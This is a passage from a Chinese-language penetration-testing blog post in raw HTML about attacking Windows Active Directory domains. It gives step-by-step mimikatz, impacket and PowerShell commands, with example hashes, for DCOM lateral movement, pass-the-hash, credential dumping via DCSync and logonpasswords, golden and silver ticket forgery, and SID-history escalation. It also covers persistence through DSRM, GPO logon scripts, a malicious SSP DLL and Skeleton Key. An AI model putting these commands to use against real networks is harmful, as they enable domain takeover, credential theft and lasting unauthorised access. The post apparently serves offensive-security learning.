class="variable">$com</span>)</span><br><span class="line"><span class="variable">$item</span>  = <span class="variable">$obj</span>.item()</span><br><span class="line"><span class="variable">$item</span>.Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c  calc.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,0)</span><br><span class="line"><span class="comment">#  方法三</span></span><br><span class="line"><span class="variable">$com</span>  = [Type]::GetTypeFromCLSID(<span class="string">&#x27;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#x27;</span>,<span class="string">&quot;1.1.1.1&quot;</span>)</span><br><span class="line"><span class="variable">$obj</span>  = [System.Activator]::CreateInstance(<span class="variable">$com</span>)</span><br><span class="line"><span class="variable">$obj</span>.Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c  calc.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,0)</span><br></pre></td></tr></table></figure>

<h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>当我们没有明文账号密码，只有hash时，可以尝试hash传递。</p>
<h4 id="impacket套件"><a href="#impacket套件" class="headerlink" title="impacket套件"></a>impacket套件</h4><p>项目下载地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket</span><br></pre></td></tr></table></figure>

<p>执行个whoami命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python  wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:208976c3facce54a3b6b003fcae5d6dc domain/administrator@1.1.1.1 <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/79.png?raw=true" alt="image-20200805223113417"></p>
<p>其他方法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用上面讲过的psexec</span></span><br><span class="line">psexec.exe  -hashes aad3b435b51404eeaad3b435b51404ee:208976c3facce54a3b6b003fcae5d6dc     domiain/administrator@1.1.1.1 <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="comment">#利用smbexec</span></span><br><span class="line">smbexec.exe  -hashes aad3b435b51404eeaad3b435b51404ee:208976c3facce54a3b6b003fcae5d6dc   domiain/administrator@1.1.1.1 <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="Invoke-TheHash套件"><a href="#Invoke-TheHash套件" class="headerlink" title="Invoke-TheHash套件"></a>Invoke-TheHash套件</h4><p>项目地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Kevin-Robertson&#x2F;Invoke-TheHash&#x2F;</span><br></pre></td></tr></table></figure>

<p>两种方式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec  -Target 1.1.1.1 -Domain test.local -Username username -Hash  7ECFFFF0C3548187607A14BAD0F88BB1 -Command <span class="string">&quot;calc.exe&quot;</span> -verbose</span><br><span class="line">Invoke-SMBExec  -Target 1.1.1.1 -Domain test.local -Username username -Hash  7ECFFFF0C3548187607A14BAD0F88BB1 -Command <span class="string">&quot;calc.exe&quot;</span> -verbose</span><br></pre></td></tr></table></figure>

<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>命令如下，这边要提一点需要在本机有管理员权限，还需要和目标相同的架构，这边使用的是X64版本的mimikatz</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth  /user:administrator /domain:ascotbe.com /ntlm:208976c3facce54a3b6b003fcae5d6dc</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/80.png?raw=true" alt="image-20200805224842818"></p>
<p>安装KB2871997补丁后，可以使用AES-256密钥进行hash传递：</p>
<p>抓取AES-256密钥：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth   /user:administrator /domain:ascotbe.com /aes256:aes256key</span><br></pre></td></tr></table></figure>

<h3 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM-Relay"></a>NTLM-Relay</h3><p>这个感觉有点鸡肋，通过钓鱼来实现的，先占坑后面要是有需求在研究</p>
<h3 id="域信任-1"><a href="#域信任-1" class="headerlink" title="域信任"></a>域信任</h3><p>当存在子父域时，默认其是双向信任。可以利用sid history跨域提权。流程大致如下：</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/104.png?raw=true" alt="img"></p>
<p>利用如下，使用mimikatz获取子域的Krbtgt Hash：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::lsa  /patch</span><br></pre></td></tr></table></figure>

<p>再使用powerview获取父域的sid：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer  -Domain ascotbe.com</span><br></pre></td></tr></table></figure>

<p>然后添加一个sid=519的企业管理员，利用mimikatz执行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden  /user:Administrator /krbtgt:5a1c26831592774a17f70370b8606449 /domain:child.ascotbe.com  /sid:S-1-5-21-1786649982-4053697927-1628754434  /sids:S-1-5-21-4288736272-2299089681-4131927610-519 /ptt</span><br></pre></td></tr></table></figure>


<h3 id="攻击Kerberos"><a href="#攻击Kerberos" class="headerlink" title="攻击Kerberos"></a>攻击Kerberos</h3><p>麻省理工学院研发Kerberos协议来保护雅典娜工程（Project Athena）提供的网络服务器。这个协议以希腊神话中的人物Kerberos（或者Cerberus）命名，他在希腊神话中是Hades的一条凶猛的三头保卫神犬。<strong>在Windows域环境中,KDC的角色常常由DC(Domain Controller)来担任</strong>,Kerberos是一种<strong>基于票据的认证方式</strong>,票据(Ticket)是用来安全的在认证服务器和用户请求的服务之间传递用户的身份,同时也会传递一些附加信息,用来保证使用Ticket的用户必须是Ticket中指定的用户,<strong>Ticket一旦生成,在生存时间内可以被Client多次使用来申请同一个Server的服务(票据窃取问题)</strong></p>
<blockquote>
<p> 这里面涉及到的一些名词缩写</p>
</blockquote>
<ul>
<li>KDC(Key Distribution Center):密钥分发中心，里面包含两个服务：AS和TGS</li>
<li>AS(Authentication Server):身份认证服务</li>
<li>TGS(Ticket Granting Server):票据授予服务,<strong>该服务提供的票据也称为 TGS 或者叫白银票据</strong></li>
<li>TGT(Ticket Granting Ticket):由身份认证服务授予的票据**(黄金票据)**，用于身份认证，存储在内存，默认有效期为10小时</li>
</ul>
<blockquote>
<p>黄金票据和白银票据的一些区别</p>
</blockquote>
<ul>
<li><p>访问权限不同</p>
<ol>
<li>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li>
<li>Silver Ticket: 伪造TGS,只能访问指定的服务</li>
</ol>
</li>
<li><p>加密方式不同</p>
<ol>
<li>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li>
<li>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li>
</ol>
</li>
<li><p>认证流程不同</p>
<ol>
<li>Golden Ticket 的利用过程需要访问域控(KDC)</li>
<li>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li>
</ol>
</li>
</ul>
<blockquote>
<p>Kerberos 的认证过程示意图</p>
</blockquote>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/114.png?raw=true" alt="此处输入图片的描述"></p>
<h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>每个用户的Ticket都是由krbtgt的密码Hash来生成的，所以我们如果拿到了krbtgt的密码Hash，就可以随意伪造Ticket了。实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/115.png?raw=true" alt="img"></p>
<blockquote>
<p>在域控上执行</p>
</blockquote>
<p>可以直接导出<strong>krbtgt</strong>账户信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:ascotbe.com &#x2F;user:krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/105.png?raw=true" alt="image-20200808181836535"></p>
<p>然后找到如下三个信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/domain：ascotbe.com</span><br><span class="line">/sid:S-1-5-21-4279882978-2535771031-421163639 <span class="comment">#最后那个502不需要</span></span><br><span class="line">/aes256:43fcdd535d27dc9644852c123c4581f69b2046754e0809344dc9cad94f64a393</span><br></pre></td></tr></table></figure>

<blockquote>
<p>生成黄金票据</p>
</blockquote>
<p>**Tips:**生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash</p>
<p>换回我们的windows 10，执行以下命令（普通用户权限即可）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:ascotbe.com /sid:S-1-5-21-4279882978-2535771031-421163639  /aes256:43fcdd535d27dc9644852c123c4581f69b2046754e0809344dc9cad94f64a393 /user:god /ticket:gold.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/106.png?raw=true" alt="image-20200808183201374"></p>
<p>票据制作成功，接下来导入我们的黄金票据，然后就可以连上域控了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt C:\Users\asc0t6e\Desktop\gold.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/107.png?raw=true" alt="image-20200808183611223"></p>
<p><strong>Tips：</strong></p>
<ol>
<li>这种方式导入的Ticket默认在20分钟以内生效，当然，如果过期了，再次ptt导入Golden Ticket就好</li>
<li>可以伪造任意用户，即使其不存在</li>
<li>krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码</li>
</ol>
<h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><p>Silver Ticket是伪造的TGS(Ticket Granting Server)ticket，所以也叫service ticket</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/108.png?raw=true" alt="img"></p>
<blockquote>
<p>域控上执行</p>
</blockquote>
<p>在域控上执行如下命令来获取域控主机的本地管理员账户hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>如果运行该命令报错了主要原因是Windows 8.1 开始为LSA提供了额外的保护（LSA Protection），以防止读取内存和不受保护的进程注入代码。保护模式要求所有加载到LSA的插件都必须使用Microsoft签名进行数字签名。 在LSA Protection保护模式下，mimikatz运行 <code>sekurlsa::logonpasswords</code>抓取密码会报错</p>
<p>运行如下命令即可绕过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot;</span> /v <span class="string">&quot;RunAsPPL&quot;</span> /t REG_DWORD /d <span class="string">&quot;00000001&quot;</span> /f</span><br></pre></td></tr></table></figure>

<p>不过这种方法需要重启电脑才行，是不是觉得这样太鸡肋了？莫慌还有一个方式来达到伪重启的方式</p>
<p>打开powershell然后执行如下两条命令，就是结束了explorer.exe进程在重新启动他即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">taskkill /im explorer.exe /f</span><br><span class="line">start c:\windows\explorer.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/109.png?raw=true" alt="image-20200808185910908"></p>
<p>这样就能抓到数据了</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/110.png?raw=true" alt="image-20200808190259737"></p>
<p>然后我们整理下我们需要的数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/domain:ascotbe.com</span><br><span class="line">/sid:S-1-5-21-4279882978-2535771031-421163639 </span><br><span class="line">/target:WIN-1OUEMJB0766.ascotbe.com</span><br><span class="line">/service:cifs</span><br><span class="line">/rc4:732c27e05330ce4f35f1efc78ecbc42a <span class="comment">#这个是NTLM的值</span></span><br><span class="line">/user:silver <span class="comment">#这个值随意</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>制作白银票据</p>
</blockquote>
<p>我们切换到windows 10上面运行如下命令（普通权限即可）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:ascotbe.com /sid:S-1-5-21-4279882978-2535771031-421163639  /target:WIN-1OUEMJB0766.ascotbe.com /service:cifs /rc4:732c27e05330ce4f35f1efc78ecbc42a /user:silver /ptt</span><br></pre></td></tr></table></figure>

<p>成功利用</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/111.png?raw=true" alt="image-20200808192143902"></p>
<h4 id="Export-the-ticket"><a href="#Export-the-ticket" class="headerlink" title="Export the ticket"></a>Export the ticket</h4><p>我们也能直接把内存中的黄金票据直接搞出来用，这个时效只有10个小时</p>
<blockquote>
<p>域控上运行</p>
</blockquote>
<p>通过mimikatz导出内存中的Ticket</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /<span class="built_in">export</span></span><br></pre></td></tr></table></figure>

<p>然后就会生成这一堆文件了</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/112.png?raw=true" alt="image-20200808193145805"></p>
<blockquote>
<p>利用</p>
</blockquote>
<p>我们把<code>[0;483d5]-2-0-40e00000-Administrator@krbtgt-ASCOTBE.COM.kirbi</code>这个文件拷贝到我们的windows 10上面，然后执行（普通权限即可）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt C:\Users\asc0t6e\Desktop\[0;483d5]-2-0-40e00000-Administrator@krbtgt-ASCOTBE.COM.kirbi</span><br></pre></td></tr></table></figure>

<p>利用成功，好像票据有点多</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/113.png?raw=true" alt="image-20200808194619665"></p>
<h4 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h4><p>占坑有点懵</p>
<h2 id="域维权"><a href="#域维权" class="headerlink" title="域维权"></a>域维权</h2><p>当拿下域控后，可以在域控上面做一些手脚，以保证后续的权限维持，甚至可以保证，就算域控密码改了，我们依然可以连接。</p>
<h3 id="DSRM"><a href="#DSRM" class="headerlink" title="DSRM"></a>DSRM</h3><p>该方法相当于重置了域控机器上的本地管理员密码。</p>
<p>DSRM，目录服务还原模式，是Windows服务器域控制器的安全模式启动选项。DSRM允许管理员用来修复或还原修复或重建活动目录数据库。DSRM账户实际上就是<strong>Administrator</strong>，也就是域控上面的本地管理员账号，非域管理员账号。当建立域控时，会让我们设置DSRM密码</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/81.png?raw=true" alt="img"></p>
<p>我们用如下命令在域控上同步DSRM密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line"><span class="built_in">set</span>  DSRM password</span><br><span class="line">SYNC  FROM DOMAIN ACCOUNT username</span><br><span class="line">Q</span><br><span class="line">Q</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/82.png?raw=true" alt="image-20200805225934318"></p>
<p>然后我们用mimikatz查看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/83.png?raw=true" alt="image-20200806201545242"></p>
<p>可以发现替换成功了，然后再在域控上添加注册表</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add  <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v  DSRMAdminLogonBehavior /t REG_DWORD /d 2</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/84.png?raw=true" alt="image-20200806201708182"></p>
<p>最后我们切换到<strong>Windows 10</strong>用pth连接过去</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth  /domain:computername /user:Administrator /ntlm:cd572964d4dec965095d4119ec53e0e2</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这边要提一嘴，搞了我好久MMP</p>
</blockquote>
<p>这边的<strong>domain</strong>是你电脑名称，不是用户名也不是域控名如下图</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/85.png?raw=true" alt="image-20200806204101914"></p>
<p>最终我们连接上了目标</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/86.png?raw=true" alt="image-20200806204006515"></p>
<h3 id="GPO"><a href="#GPO" class="headerlink" title="GPO"></a>GPO</h3><p>当我们获取到管理员权限时，可以通过添加组策略手段，实现用户开机自启动，jumbo师傅没有提的一点我提一下，运行的脚本需要放到访问共享中，不然其他机器没办法加载我们的脚本的</p>
<p>域控上执行过程如下：</p>
<p>首先建立共享</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/87.png?raw=true" alt="image-20200806214504438"></p>
<p>如图所示netlogon、sysvol 共享文件夹为升级域控建立的共享文件夹。</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/88.png?raw=true" alt="image-20200806214553597"></p>
<p>这两个文件夹有些机器是没办法访问的，我们打开高级共享设置</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/89.png?raw=true" alt="image-20200806221953976"></p>
<p>然后把这三个位置的启动共享都给打开</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/90.png?raw=true" alt="image-20200806222101138"></p>
<p>接下来我们切换到Windows10看共享文件夹</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/91.png?raw=true" alt="image-20200806222201365"></p>
<p>可以看到多了个Users文件，然后我们切换回windows2008，将之前做好的bat文件复制到如下共享文件目录。</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/92.png?raw=true" alt="image-20200806222315575"></p>
<p>我是复制到这个目录下，只要在这个目录下的任意文件夹都可以，接着打开gpmc.msc ，编辑默认组策略</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/93.png?raw=true" alt="image-20200806204517983"></p>
<p>然后添加启动项</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/94.png?raw=true" alt="image-20200806204619026"></p>
<p>然后在登录位置添加脚本</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/95.png?raw=true" alt="image-20200806214935776"></p>
<p>点击浏览后把我们先共享的路径复制过去</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/96.png?raw=true" alt="image-20200806222454472"></p>
<p>接着点击确定就好</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/97.png?raw=true" alt="image-20200806222526281"></p>
<p>再执行如下命令强制刷新组策略</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate  /force</span><br></pre></td></tr></table></figure>

<p>重启Windows10就能看到执行了我们的脚本，同理还可以设置powershell脚本</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/98.png?raw=true" alt="image-20200806222804243"></p>
<p>也可以添加计划任务</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/99.png?raw=true" alt="image-20200806220219836"></p>
<p>具体自己设置即可</p>
<h3 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h3><p>　SSP（Security Support Provider）是windows操作系统安全机制的提供者。简单的说，SSP就是DLL文件，主要用于windows操作系统的身份认证功能，例如NTLM、Kerberos、Negotiate、Secure Channel（Schannel）、Digest、Credential（CredSSP）。</p>
<p>　　SSPI（Security Support Provider Interface，安全支持提供程序接口）是windows操作系统在执行认证操作时使用的API接口。可以说SSPI就是SSP的API接口。</p>
<p>如果获得目标系统system权限，可以使用该方法进行持久化操作。其主要原理是：LSA（Local Security Authority）用于身份验证；lsass.exe作为windows的系统进程，用于本地安全和登录策略；在系统启动时，SSP将被加载到lsass.exe 进程中。但是，假如攻击者对LSA进行了扩展，自定义了恶意的DLL文件，在系统启动时将其加载到lsass.exe进程中，就能够获取lsass.exe进程中的明文密码。这样即使用户更改密码并重新登录，攻击者依然可以获得该账号的新密码。</p>
<p><strong>利用mimikatz来完成</strong></p>
<ul>
<li>将mimilib.dll复制到域控<strong>c:\windows\system32</strong></li>
<li>添加注册表:<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\SecurityPackages\</code>中</li>
<li>重启后记录登录的密码</li>
</ul>
<p>具体代码如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy mimilib.dll %systemroot%\system32</span><br><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v <span class="string">&quot;Security Packages&quot;</span></span><br><span class="line">reg add <span class="string">&quot;hklm\system\currentcontrolset\control\lsa\&quot; /v &quot;</span>Security Packages<span class="string">&quot; /d &quot;</span>kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib<span class="string">&quot; /t REG_MULTI_SZ</span></span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/100.png?raw=true" alt="image-20200806224652440"></p>
<p>然后重启后查看文件</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/101.png?raw=true" alt="image-20200806225606582"></p>
<h3 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h3><p>利用mimikatz安装一个万能密码<code>mimikatz</code>，实现代码可以参考如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz&#x2F;blob&#x2F;master&#x2F;mimikatz&#x2F;modules&#x2F;kuhl_m_misc.c</span><br></pre></td></tr></table></figure>

<p>执行完一下命令就可以使用<code>mimikatz</code>作为一个万能密码，去连接域控，该方法可用于当域控密码被改掉时，我们依然可以去控制域控。</p>
<blockquote>
<p>注意X64机器要使用X64版本的mimikatz</p>
</blockquote>
<p>在域控上运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/102.png?raw=true" alt="image-20200806230603129"></p>
<p>在域内主机上运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\WIN-1OUEMJB0766.ascotbe.com <span class="string">&quot;mimikatz&quot;</span> /user:ascotbe.com\administrator</span><br><span class="line">dir \\WIN-1OUEMJB0766.ascotbe.com\c$</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/103.png?raw=true" alt="image-20200806231009027"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;payloads.online&#x2F;archivers&#x2F;2019-04-13&#x2F;1</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MjM5NzE1NjA0MQ&#x3D;&#x3D;&amp;mid&#x3D;2651202058&amp;idx&#x3D;1&amp;sn&#x3D;d3d57af49cea5f15d2c58b83bac35b7d&amp;chksm&#x3D;bd2cc7ac8a5b4ebafac72bb78d523f4956804a0d063f9e33f0f49ace2417a6c392738947330a&amp;mpshare&#x3D;1&amp;scene&#x3D;1&amp;srcid&#x3D;0728NuHlnt4yB5qhc3gWClqQ&amp;sharer_sharetime&#x3D;1595949460134&amp;sharer_shareid&#x3D;de4f8e5a5ad7bd6a89317b77fa1ff085#rd</span><br><span class="line">https:&#x2F;&#x2F;man.linuxde.net&#x2F;ssh</span><br><span class="line">http:&#x2F;&#x2F;linux.51yip.com&#x2F;search&#x2F;ssh</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;ccfxue&#x2F;article&#x2F;details&#x2F;53159896</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2527</span><br><span class="line">https:&#x2F;&#x2F;www.codenong.com&#x2F;cs105941102&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;MS_Tony_Shu&#x2F;article&#x2F;details&#x2F;93723432</span><br><span class="line">https:&#x2F;&#x2F;wooyun.js.org&#x2F;drops&#x2F;%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6943</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ascotbe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.ascotbe.com/2020/08/03/IntranetPenetration/">https://www.ascotbe.com/2020/08/03/IntranetPenetration/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.ascotbe.com" target="_blank">ascotbe</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/112.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li><li class="reward-item"><a href="/" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/11/02/WindowsTalk/"><img class="prev-cover" src="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/116.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div 